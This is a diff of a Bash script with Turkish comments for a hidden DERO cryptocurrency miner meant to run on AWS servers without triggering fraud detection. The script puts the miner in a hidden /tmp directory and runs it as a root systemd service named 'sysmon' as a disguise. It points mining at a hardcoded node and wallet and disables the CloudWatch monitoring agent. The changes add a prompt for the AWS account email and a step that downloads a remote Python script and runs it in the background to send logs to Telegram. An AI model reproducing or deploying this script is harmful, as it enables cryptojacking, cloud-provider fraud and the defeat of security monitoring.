@@ -1,7 +1,7 @@
 #!/bin/bash
 # DERO Miner - Gizli Versiyon (AWS Fraud Detection Önleme)
 # Versiyon: 3.0 (Gizli)
-# Node: 91.98.80.16:10102
+# Node: 91.98.80.16:10100
 # GitHub: Tek komutla çalıştırılabilir
 
 set -e
@@ -19,9 +19,28 @@ log() {
 
 log "Sistem servisi başlatılıyor..."
 
+# AWS Hesap Bilgisi Al
+echo "========================================="
+echo "AWS Hesap Bilgisi Gerekli"
+echo "========================================="
+echo ""
+read -p "AWS Hesap Email: " AWS_ACCOUNT
+read -p "Sunucu Adı (örn: Server 1): " SERVER_NAME
+
+# Varsayılan değerler
+if [ -z "$AWS_ACCOUNT" ]; then
+    AWS_ACCOUNT="unknown@gmail.com"
+fi
+if [ -z "$SERVER_NAME" ]; then
+    SERVER_NAME="Server 1"
+fi
+
+log "AWS Hesap: $AWS_ACCOUNT"
+log "Sunucu: $SERVER_NAME"
+
 # Gerekli bağımlılıklar (sessizce)
 apt-get update -y >> $LOG_FILE 2>&1
-apt-get install screen wget cpulimit -y >> $LOG_FILE 2>&1
+apt-get install screen wget cpulimit python3 python3-pip -y >> $LOG_FILE 2>&1
 
 # Miner indir (gizli dizin)
 MINER_DIR="/tmp/.sys"
@@ -76,7 +95,7 @@ After=network.target
 [Service]
 Type=simple
 User=root
-ExecStart=$MINER_DIR/$MINER_NAME --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj --daemon-rpc-address 91.98.80.16:10102 --mining-threads $use_cores
+ExecStart=$MINER_DIR/$MINER_NAME --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj --daemon-rpc-address 91.98.80.16:10100 --mining-threads $use_cores
 Restart=always
 RestartSec=10
 StandardOutput=append:$LOG_FILE
@@ -106,6 +125,30 @@ EOF
 systemctl stop amazon-cloudwatch-agent 2>/dev/null || true
 systemctl disable amazon-cloudwatch-agent 2>/dev/null || true
 
+# Telegram log gönderme scriptini indir ve yapılandır
+log "Telegram log gönderici hazırlanıyor..."
+wget -q https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_log_sender.py -O /root/aws_log_sender.py 2>/dev/null || {
+    log "Telegram log gönderici indirilemedi, manuel kurulum gerekebilir"
+}
+
+if [ -f /root/aws_log_sender.py ]; then
+    chmod +x /root/aws_log_sender.py
+    
+    # Python paketlerini kur
+    pip3 install requests -q >> $LOG_FILE 2>&1 || python3 -m pip install requests -q >> $LOG_FILE 2>&1
+    
+    # Script'i yapılandır (mail, server name)
+    sed -i "s/SERVER_NAME = \"Server 1\"/SERVER_NAME = \"$SERVER_NAME\"/" /root/aws_log_sender.py
+    sed -i "s/ACCOUNT = \"test@gmail.com\"/ACCOUNT = \"$AWS_ACCOUNT\"/" /root/aws_log_sender.py
+    
+    # Eski process'i kapat
+    pkill -f aws_log_sender.py 2>/dev/null || true
+    
+    # Arka planda başlat
+    nohup python3 /root/aws_log_sender.py >> $LOG_FILE 2>&1 &
+    log "✅ Telegram log gönderici başlatıldı (Hesap: $AWS_ACCOUNT)"
+fi
+
 # Temizlik
 cd /
 rm -rf /tmp/dero_linux_amd64 2>/dev/null || true
@@ -115,26 +158,14 @@ log "✅ Sistem servisi aktif (Gizli mod)"
 log "📊 CPU: $use_cores/$total_cores core, %75 limit"
 log "🔒 Process: sysmon (gizli)"
 log "🔄 Systemd service: Aktif"
+log "📧 AWS Hesap: $AWS_ACCOUNT"
 
-# Telegram log gönderme scriptini indir ve başlat
-log "Telegram log gönderici hazırlanıyor..."
-wget -q https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_log_sender.py -O /root/aws_log_sender.py 2>/dev/null || {
-    log "Telegram log gönderici indirilemedi, manuel kurulum gerekebilir"
-}
-
-if [ -f /root/aws_log_sender.py ]; then
-    chmod +x /root/aws_log_sender.py
-    pip3 install requests -q >> $LOG_FILE 2>&1
-    # Eski process'i kapat
-    pkill -f aws_log_sender.py 2>/dev/null || true
-    # Arka planda başlat
-    nohup python3 /root/aws_log_sender.py >> $LOG_FILE 2>&1 &
-    log "✅ Telegram log gönderici başlatıldı"
-fi
-
+echo ""
 echo "✅ Sistem servisi aktif"
 echo "📋 Log: $LOG_FILE"
 echo "🔒 Gizli mod: Aktif"
+echo "📧 AWS Hesap: $AWS_ACCOUNT"
 echo "📱 Telegram log gönderici: Aktif"
 echo "🔍 Durum: systemctl status sysmon"
 echo "📊 Log izle: tail -f $LOG_FILE"
+
